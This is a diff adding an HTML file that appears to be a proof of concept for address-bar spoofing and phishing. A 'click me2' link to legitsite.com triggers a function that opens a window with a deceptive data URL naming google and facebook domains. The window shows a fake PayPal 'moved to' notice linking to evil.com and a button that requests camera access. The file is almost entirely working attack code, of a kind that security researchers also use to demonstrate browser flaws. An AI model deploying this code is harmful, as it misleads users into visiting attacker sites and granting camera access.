@@ -1,0 +1,33 @@
+<script>
+function pwned() {
+    var t = window.open('data:#verylongurl.google.facebook.com');
+    
+    // Add content to the new window
+    t.document.write(`
+        <h1>Paypal has been moved to</h1>
+        <a href="https://evil.com">Evil.com</a>
+        <br>
+        <button id="cameraButton">Click to enable camera</button>
+        <video id="cameraFeed" width="640" height="480" autoplay></video>
+    `);
+
+    // When the button is clicked, request camera permission
+    t.document.getElementById('cameraButton').addEventListener('click', function() {
+        // Request camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                // If permission is granted, display the camera feed
+                var videoElement = t.document.getElementById('cameraFeed');
+                videoElement.srcObject = stream;
+            })
+            .catch(function(error) {
+                // If the user denies or there's an error
+                alert('Camera access denied or error occurred: ' + error);
+            });
+    });
+
+    t.stop();
+}
+</script>
+
+<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
